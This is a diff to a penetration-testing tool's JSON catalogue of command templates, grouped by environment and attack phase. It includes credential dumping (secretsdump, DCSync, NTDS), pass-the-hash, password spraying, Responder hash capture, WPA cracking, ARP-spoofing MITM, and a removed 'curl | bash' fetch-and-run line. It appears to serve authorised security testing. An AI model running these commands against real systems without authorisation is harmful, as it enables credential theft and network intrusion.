@@ -3,56 +3,64 @@
     "recon": [
       {"tool": "whois", "command_template": "whois {{ target }}", "description": "Domain registration and ownership lookup", "install": "apt install whois"},
       {"tool": "dig", "command_template": "dig {{ target }} ANY +noall +answer", "description": "DNS record enumeration", "install": "apt install dnsutils"},
-      {"tool": "theHarvester", "command_template": "theHarvester -d {{ target }} -b all -l 200", "description": "Email, subdomain, and name harvesting from public sources", "install": "apt install theharvester"},
-      {"tool": "subfinder", "command_template": "subfinder -d {{ target }} -silent", "description": "Passive subdomain discovery", "install": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"}
+      {"tool": "theHarvester", "command_template": "theHarvester -d {{ target }} -b all -l 200", "description": "Email, subdomain, and name harvesting from public sources", "install": "pipx install theHarvester"},
+      {"tool": "subfinder", "command_template": "subfinder -d {{ target }} -silent", "description": "Passive subdomain discovery", "install": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"},
+      {"tool": "amass", "command_template": "amass enum -passive -d {{ target }}", "description": "Passive attack-surface mapping and subdomain enumeration", "install": "snap install amass"}
     ],
     "scanning": [
       {"tool": "nmap", "command_template": "sudo nmap -sS -sV -O -A -p- --open -v {{ target }}", "description": "Full TCP SYN scan with service/OS detection", "install": "apt install nmap"},
-      {"tool": "masscan", "command_template": "sudo masscan {{ target }}/24 -p1-65535 --rate=1000 -oL masscan_results.txt", "description": "High-speed port scanner for initial discovery", "install": "apt install masscan"}
+      {"tool": "masscan", "command_template": "sudo masscan {{ target }}/24 -p1-65535 --rate=1000 -oL masscan_results.txt", "description": "High-speed port scanner for initial discovery", "install": "apt install masscan"},
+      {"tool": "nuclei", "command_template": "nuclei -u {{ target }} -severity medium,high,critical", "description": "Template-based CVE and misconfiguration scanning", "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}
     ],
     "enumeration": [
       {"tool": "gobuster", "command_template": "gobuster dir -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -t 50", "description": "Web directory and file brute-forcing", "install": "apt install gobuster"},
-      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "SMB/NetBIOS enumeration", "install": "apt install enum4linux"},
-      {"tool": "ffuf", "command_template": "ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302", "description": "Fast web fuzzer for directories, parameters, and virtual hosts", "install": "go install github.com/ffuf/ffuf/v2@latest"}
+      {"tool": "ffuf", "command_template": "ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302", "description": "Fast web fuzzer for directories, parameters, and virtual hosts", "install": "go install github.com/ffuf/ffuf/v2@latest"},
+      {"tool": "feroxbuster", "command_template": "feroxbuster -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt", "description": "Recursive content discovery", "install": "see Settings → Tools"},
+      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "SMB/NetBIOS enumeration", "install": "see Settings → Tools"}
     ],
     "exploitation": [
       {"tool": "searchsploit", "command_template": "searchsploit {{ service_name }} {{ service_version }}", "description": "Search Exploit-DB for known exploits matching discovered services", "install": "apt install exploitdb"},
-      {"tool": "sqlmap", "command_template": "sqlmap -u '{{ target_url }}' --batch --level=3 --risk=2", "description": "Automated SQL injection detection and exploitation", "install": "apt install sqlmap"},
+      {"tool": "sqlmap", "command_template": "sqlmap -u 'http://{{ target }}' --batch --level=3 --risk=2", "description": "Automated SQL injection detection and exploitation", "install": "apt install sqlmap"},
       {"tool": "hydra", "command_template": "hydra -L users.txt -P passwords.txt {{ target }} {{ protocol }}", "description": "Brute-force login for network services", "install": "apt install hydra"}
     ],
     "post_exploitation": [
-      {"tool": "linpeas", "command_template": "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash", "description": "Linux privilege escalation audit script", "install": "Download from GitHub releases"},
-      {"tool": "pspy", "command_template": "./pspy64 -i 1000", "description": "Monitor processes without root — catch cron jobs and scripts", "install": "Download from GitHub releases"}
+      {"tool": "linpeas", "command_template": "linpeas", "description": "Linux privilege escalation audit script", "install": "see Settings → Tools"},
+      {"tool": "pspy", "command_template": "pspy -i 1000", "description": "Monitor processes without root — catch cron jobs and scripts", "install": "see Settings → Tools"}
     ]
   },
   "internal_network": {
     "recon": [
       {"tool": "nmap", "command_template": "sudo nmap -sn {{ target }}/24 -v", "description": "Internal network host discovery", "install": "apt install nmap"},
-      {"tool": "netdiscover", "command_template": "sudo netdiscover -r {{ target }}/24 -P", "description": "ARP-based host discovery for internal networks", "install": "apt install netdiscover"}
+      {"tool": "netdiscover", "command_template": "sudo netdiscover -r {{ target }}/24 -P", "description": "ARP-based host discovery for internal networks", "install": "apt install netdiscover"},
+      {"tool": "arp-scan", "command_template": "sudo arp-scan --localnet", "description": "Fast ARP sweep of the local segment", "install": "apt install arp-scan"}
     ],
     "scanning": [
       {"tool": "nmap", "command_template": "sudo nmap -sS -sV -O -p- --open -v {{ target }}", "description": "Comprehensive internal port scan", "install": "apt install nmap"},
       {"tool": "masscan", "command_template": "sudo masscan {{ target }}/24 -p1-65535 --rate=500 -oL internal_masscan.txt", "description": "Fast internal port scan", "install": "apt install masscan"}
     ],
     "enumeration": [
-      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "SMB/NetBIOS enumeration for Windows hosts", "install": "apt install enum4linux"},
+      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "SMB/NetBIOS enumeration for Windows hosts", "install": "see Settings → Tools"},
       {"tool": "smbclient", "command_template": "smbclient -L //{{ target }} -N", "description": "List SMB shares anonymously", "install": "apt install smbclient"},
-      {"tool": "rpcclient", "command_template": "rpcclient -U '' {{ target }}", "description": "RPC enumeration for Windows environments", "install": "apt install samba-common-bin"}
+      {"tool": "rpcclient", "command_template": "rpcclient -U '' -N {{ target }}", "description": "RPC enumeration for Windows environments", "install": "apt install samba-common-bin"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --shares", "description": "Anonymous SMB share enumeration via NetExec", "install": "pipx install netexec"}
     ],
     "exploitation": [
-      {"tool": "responder", "command_template": "sudo responder -I {{ interface }} -rdwv", "description": "LLMNR/NBT-NS/mDNS poisoner — captures NTLMv2 hashes from broadcast name resolution", "install": "apt install responder"},
+      {"tool": "responder", "command_template": "sudo responder -I {{ interface }} -rdwv", "description": "LLMNR/NBT-NS/mDNS poisoner — captures NTLMv2 hashes from broadcast name resolution", "install": "see Settings → Tools"},
       {"tool": "searchsploit", "command_template": "searchsploit {{ service_name }} {{ service_version }}", "description": "Local exploit database search", "install": "apt install exploitdb"},
-      {"tool": "hydra", "command_template": "hydra -L users.txt -P passwords.txt {{ target }} smb", "description": "SMB credential brute force", "install": "apt install hydra"}
+      {"tool": "hydra", "command_template": "hydra -L users.txt -P passwords.txt {{ target }} smb", "description": "SMB credential brute force", "install": "apt install hydra"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -H {{ hash }} --local-auth", "description": "Pass-the-hash authentication via NetExec", "install": "pipx install netexec"}
     ],
     "post_exploitation": [
-      {"tool": "linpeas", "command_template": "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash", "description": "Linux privilege escalation enumeration", "install": "Download from GitHub releases"},
-      {"tool": "pspy", "command_template": "./pspy64 -i 1000", "description": "Process spy without root privileges", "install": "Download from GitHub releases"}
+      {"tool": "linpeas", "command_template": "linpeas", "description": "Linux privilege escalation enumeration", "install": "see Settings → Tools"},
+      {"tool": "pspy", "command_template": "pspy -i 1000", "description": "Process spy without root privileges", "install": "see Settings → Tools"},
+      {"tool": "impacket-secretsdump", "command_template": "impacket-secretsdump '{{ username }}:{{ password }}@{{ target }}'", "description": "Dump local SAM/LSA secrets from a compromised host", "install": "pip install impacket"}
     ]
   },
   "web_application": {
     "recon": [
       {"tool": "whatweb", "command_template": "whatweb {{ target }} -v", "description": "Web technology fingerprinting", "install": "apt install whatweb"},
-      {"tool": "wafw00f", "command_template": "wafw00f {{ target }}", "description": "Web Application Firewall detection", "install": "pip install wafw00f"}
+      {"tool": "wafw00f", "command_template": "wafw00f {{ target }}", "description": "Web Application Firewall detection", "install": "pipx install wafw00f"},
+      {"tool": "subfinder", "command_template": "subfinder -d {{ target }} -silent", "description": "Discover related subdomains/vhosts", "install": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"}
     ],
     "scanning": [
       {"tool": "nmap", "command_template": "nmap -sV -p 80,443,8080,8443 --script http-enum {{ target }}", "description": "Web-focused port scan with HTTP enumeration", "install": "apt install nmap"},
@@ -62,68 +70,91 @@
     "enumeration": [
       {"tool": "gobuster", "command_template": "gobuster dir -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt", "description": "Web directory and file discovery", "install": "apt install gobuster"},
       {"tool": "ffuf", "command_template": "ffuf -u http://{{ target }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403", "description": "Fast web fuzzer", "install": "go install github.com/ffuf/ffuf/v2@latest"},
-      {"tool": "wfuzz", "command_template": "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://{{ target }}/FUZZ", "description": "Web application fuzzer", "install": "apt install wfuzz"}
+      {"tool": "feroxbuster", "command_template": "feroxbuster -u http://{{ target }} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt", "description": "Recursive content discovery", "install": "see Settings → Tools"},
+      {"tool": "wfuzz", "command_template": "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://{{ target }}/FUZZ", "description": "Web application fuzzer", "install": "pipx install wfuzz"}
     ],
     "exploitation": [
       {"tool": "sqlmap", "command_template": "sqlmap -u 'http://{{ target }}' --batch --crawl=3 --level=3 --risk=2", "description": "SQL injection testing and exploitation", "install": "apt install sqlmap"},
-      {"tool": "xsser", "command_template": "xsser --url 'http://{{ target }}' -a", "description": "XSS vulnerability scanner", "install": "apt install xsser"},
-      {"tool": "burpsuite", "command_template": "burpsuite", "description": "Manual web app testing via proxy (launch manually)", "install": "Download from PortSwigger"}
+      {"tool": "dalfox", "command_template": "dalfox url http://{{ target }}", "description": "Fast CLI XSS scanner (parameter analysis + verification)", "install": "go install github.com/hahwul/dalfox/v2@latest"},
+      {"tool": "nuclei", "command_template": "nuclei -u http://{{ target }} -tags cve,exposure,misconfig -severity medium,high,critical", "description": "Template-based web vulnerability scanning", "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}
     ],
     "post_exploitation": [
-      {"tool": "weevely", "command_template": "weevely generate password /tmp/shell.php", "description": "PHP web shell generator and manager", "install": "apt install weevely"}
+      {"tool": "linpeas", "command_template": "linpeas", "description": "Privilege escalation enumeration once a shell is obtained", "install": "see Settings → Tools"},
+      {"tool": "pspy", "command_template": "pspy -i 1000", "description": "Monitor processes/cron jobs from a low-priv web shell", "install": "see Settings → Tools"}
     ]
   },
   "active_directory": {
     "recon": [
       {"tool": "nmap", "command_template": "nmap -sV -p 88,135,139,389,445,464,593,636,3268,3269,5985 {{ target }}", "description": "Scan common AD/Kerberos/LDAP/SMB ports", "install": "apt install nmap"},
-      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "Enumerate SMB shares, users, groups, and policies", "install": "apt install enum4linux"},
-      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --shares", "description": "Anonymous SMB share enumeration via NetExec", "install": "pip install netexec"}
+      {"tool": "enum4linux", "command_template": "enum4linux -a {{ target }}", "description": "Enumerate SMB shares, users, groups, and policies", "install": "see Settings → Tools"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --shares", "description": "Anonymous SMB share enumeration via NetExec", "install": "pipx install netexec"}
     ],
     "scanning": [
       {"tool": "kerbrute", "command_template": "kerbrute userenum --dc {{ target }} -d {{ domain }} /usr/share/seclists/Usernames/Names/names.txt", "description": "Kerberos user enumeration (no failed-login noise)", "install": "go install github.com/ropnop/kerbrute@latest"},
-      {"tool": "nxc", "command_template": "nxc ldap {{ target }} -u '' -p '' --users", "description": "LDAP user enumeration via NetExec", "install": "pip install netexec"},
-      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --pass-pol", "description": "Enumerate password policy (lockout threshold, min length)", "install": "pip install netexec"}
+      {"tool": "nxc", "command_template": "nxc ldap {{ target }} -u '' -p '' --users", "description": "LDAP user enumeration via NetExec", "install": "pipx install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u '' -p '' --pass-pol", "description": "Enumerate password policy (lockout threshold, min length)", "install": "pipx install netexec"}
     ],
     "enumeration": [
-      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --loggedon-users", "description": "List users currently logged on to target", "install": "pip install netexec"},
-      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --shares", "description": "List accessible SMB shares with credentials", "install": "pip install netexec"},
-      {"tool": "nxc", "command_template": "nxc ldap {{ target }} -u {{ username }} -p {{ password }} --groups", "description": "Enumerate AD groups via LDAP", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --loggedon-users", "description": "List users currently logged on to target", "install": "pipx install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --shares", "description": "List accessible SMB shares with credentials", "install": "pipx install netexec"},
+      {"tool": "nxc", "command_template": "nxc ldap {{ target }} -u {{ username }} -p {{ password }} --groups", "description": "Enumerate AD groups via LDAP", "install": "pipx install netexec"},
       {"tool": "impacket-GetUserSPNs", "command_template": "impacket-GetUserSPNs '{{ domain }}/{{ username }}:{{ password }}' -dc-ip {{ target }} -request", "description": "Kerberoasting — request TGS tickets for service accounts", "install": "pip install impacket"},
       {"tool": "impacket-GetNPUsers", "command_template": "impacket-GetNPUsers '{{ domain }}/' -dc-ip {{ target }} -usersfile users.txt -no-pass -format hashcat", "description": "AS-REP roasting — get hashes for accounts with pre-auth disabled", "install": "pip install impacket"}
     ],
     "exploitation": [
       {"tool": "kerbrute", "command_template": "kerbrute passwordspray --dc {{ target }} -d {{ domain }} users.txt {{ password }}", "description": "Kerberos password spray (avoids NTLM lockouts)", "install": "go install github.com/ropnop/kerbrute@latest"},
-      {"tool": "nxc", "command_template": "nxc smb {{ target }}/24 -u {{ username }} -p {{ password }} --continue-on-success", "description": "SMB credential spray across subnet", "install": "pip install netexec"},
-      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -H {{ hash }} --local-auth", "description": "Pass-the-hash via NetExec", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }}/24 -u {{ username }} -p {{ password }} --continue-on-success", "description": "SMB credential spray across subnet", "install": "pipx install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -H {{ hash }} --local-auth", "description": "Pass-the-hash via NetExec", "install": "pipx install netexec"},
       {"tool": "impacket-psexec", "command_template": "impacket-psexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "Remote execution via SMB service pipe", "install": "pip install impacket"},
       {"tool": "impacket-wmiexec", "command_template": "impacket-wmiexec '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "Remote execution via WMI (lower noise than psexec)", "install": "pip install impacket"}
     ],
     "post_exploitation": [
       {"tool": "impacket-secretsdump", "command_template": "impacket-secretsdump '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "Dump SAM, LSA secrets, cached credentials and NTDS.dit hashes", "install": "pip install impacket"},
-      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --ntds", "description": "Dump NTDS.dit domain hashes via NetExec", "install": "pip install netexec"},
+      {"tool": "nxc", "command_template": "nxc smb {{ target }} -u {{ username }} -p {{ password }} --ntds", "description": "Dump NTDS.dit domain hashes via NetExec", "install": "pipx install netexec"},
       {"tool": "impacket-secretsdump", "command_template": "impacket-secretsdump -just-dc-ntlm '{{ domain }}/{{ username }}:{{ password }}@{{ target }}'", "description": "DCSync — pull all NTLM hashes from domain controller", "install": "pip install impacket"}
     ]
   },
   "cloud_aws": {
     "recon": [
-      {"tool": "aws", "command_template": "aws sts get-caller-identity --profile {{ aws_profile }}", "description": "Verify AWS credentials and account identity", "install": "apt install awscli"},
-      {"tool": "aws", "command_template": "aws iam get-account-summary --profile {{ aws_profile }}", "description": "Get IAM account-level summary", "install": "apt install awscli"}
+      {"tool": "aws", "command_template": "aws sts get-caller-identity --profile {{ aws_profile }}", "description": "Verify AWS credentials and account identity", "install": "pip3 install awscli"},
+      {"tool": "aws", "command_template": "aws iam get-account-summary --profile {{ aws_profile }}", "description": "Get IAM account-level summary", "install": "pip3 install awscli"}
     ],
     "scanning": [
-      {"tool": "aws", "command_template": "aws s3api list-buckets --profile {{ aws_profile }}", "description": "List all S3 buckets", "install": "apt install awscli"},
-      {"tool": "aws", "command_template": "aws ec2 describe-instances --profile {{ aws_profile }} --region {{ aws_region }}", "description": "Enumerate EC2 instances", "install": "apt install awscli"}
+      {"tool": "aws", "command_template": "aws s3api list-buckets --profile {{ aws_profile }}", "description": "List all S3 buckets", "install": "pip3 install awscli"},
+      {"tool": "aws", "command_template": "aws ec2 describe-instances --profile {{ aws_profile }} --region {{ aws_region }}", "description": "Enumerate EC2 instances", "install": "pip3 install awscli"}
     ],
     "enumeration": [
-      {"tool": "aws", "command_template": "aws iam list-users --profile {{ aws_profile }}", "description": "List IAM users", "install": "apt install awscli"},
-      {"tool": "aws", "command_template": "aws iam list-roles --profile {{ aws_profile }}", "description": "List IAM roles", "install": "apt install awscli"},
-      {"tool": "aws", "command_template": "aws cloudtrail describe-trails --profile {{ aws_profile }}", "description": "Check CloudTrail logging configuration", "install": "apt install awscli"}
+      {"tool": "aws", "command_template": "aws iam list-users --profile {{ aws_profile }}", "description": "List IAM users", "install": "pip3 install awscli"},
+      {"tool": "aws", "command_template": "aws iam list-roles --profile {{ aws_profile }}", "description": "List IAM roles", "install": "pip3 install awscli"},
+      {"tool": "aws", "command_template": "aws cloudtrail describe-trails --profile {{ aws_profile }}", "description": "Check CloudTrail logging configuration", "install": "pip3 install awscli"}
     ],
     "exploitation": [
-      {"tool": "aws", "command_template": "aws s3api get-bucket-acl --bucket {{ bucket_name }} --profile {{ aws_profile }}", "description": "Check S3 bucket ACL for public access", "install": "apt install awscli"},
-      {"tool": "aws", "command_template": "aws iam simulate-principal-policy --policy-source-arn {{ iam_arn }} --action-names '*' --profile {{ aws_profile }}", "description": "Simulate IAM policy permissions", "install": "apt install awscli"}
+      {"tool": "aws", "command_template": "aws s3api get-bucket-acl --bucket {{ bucket_name }} --profile {{ aws_profile }}", "description": "Check S3 bucket ACL for public access", "install": "pip3 install awscli"},
+      {"tool": "aws", "command_template": "aws iam simulate-principal-policy --policy-source-arn {{ iam_arn }} --action-names '*' --profile {{ aws_profile }}", "description": "Simulate IAM policy permissions", "install": "pip3 install awscli"}
     ],
     "post_exploitation": [
-      {"tool": "aws", "command_template": "aws iam create-access-key --user-name {{ username }} --profile {{ aws_profile }}", "description": "Create persistent access key (authorized testing only)", "install": "apt install awscli"}
+      {"tool": "aws", "command_template": "aws iam create-access-key --user-name {{ username }} --profile {{ aws_profile }}", "description": "Create persistent access key (authorized testing only)", "install": "pip3 install awscli"}
+    ]
+  },
+  "wireless": {
+    "recon": [
+      {"tool": "airmon-ng", "command_template": "sudo airmon-ng start {{ target }}", "description": "Enable monitor mode on the wireless interface (target = interface, e.g. wlan0)", "install": "apt install aircrack-ng"},
+      {"tool": "airodump-ng", "command_template": "sudo airodump-ng {{ target }}mon", "description": "Discover nearby access points and clients", "install": "apt install aircrack-ng"}
+    ],
+    "scanning": [
+      {"tool": "airodump-ng", "command_template": "sudo airodump-ng --bssid {{ bssid }} -c {{ channel }} -w capture {{ target }}mon", "description": "Targeted capture of a specific AP (writes handshake to capture-*.cap)", "install": "apt install aircrack-ng"},
+      {"tool": "wifite", "command_template": "sudo wifite -i {{ target }}mon", "description": "Automated wireless auditing across discovered networks", "install": "apt install wifite"}
+    ],
+    "enumeration": [
+      {"tool": "bettercap", "command_template": "sudo bettercap -iface {{ target }} -eval 'wifi.recon on'", "description": "Live WiFi reconnaissance and client enumeration", "install": "apt install bettercap"},
+      {"tool": "airodump-ng", "command_template": "sudo airodump-ng --bssid {{ bssid }} -c {{ channel }} {{ target }}mon", "description": "Enumerate clients associated with the target AP", "install": "apt install aircrack-ng"}
+    ],
+    "exploitation": [
+      {"tool": "aircrack-ng", "command_template": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", "description": "Crack a captured WPA/WPA2 handshake against a wordlist", "install": "apt install aircrack-ng"},
+      {"tool": "reaver", "command_template": "sudo reaver -i {{ target }}mon -b {{ bssid }} -vv", "description": "WPS PIN brute force against vulnerable access points", "install": "apt install reaver"}
+    ],
+    "post_exploitation": [
+      {"tool": "bettercap", "command_template": "sudo bettercap -iface {{ target }} -eval 'set arp.spoof.targets {{ victim_ip }}; arp.spoof on; net.sniff on'", "description": "On-network MITM / traffic capture after joining the WLAN", "install": "apt install bettercap"}
     ]
   }
 }
